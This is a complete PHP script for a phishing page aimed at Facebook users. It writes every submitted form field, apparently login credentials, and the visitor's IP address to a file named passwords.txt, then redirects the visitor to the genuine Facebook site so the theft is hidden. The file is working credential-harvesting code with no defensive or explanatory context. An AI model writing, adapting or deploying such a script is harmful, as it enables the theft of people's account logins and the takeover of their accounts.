<?php
header ('Location: https://en-gb.facebook.com/ ');
$handle = fopen("passwords.txt", "a");
$ip = $_SERVER['REMOTE_ADDR'];
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "IP=$ip");
fwrite($handle, "\r\n");
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>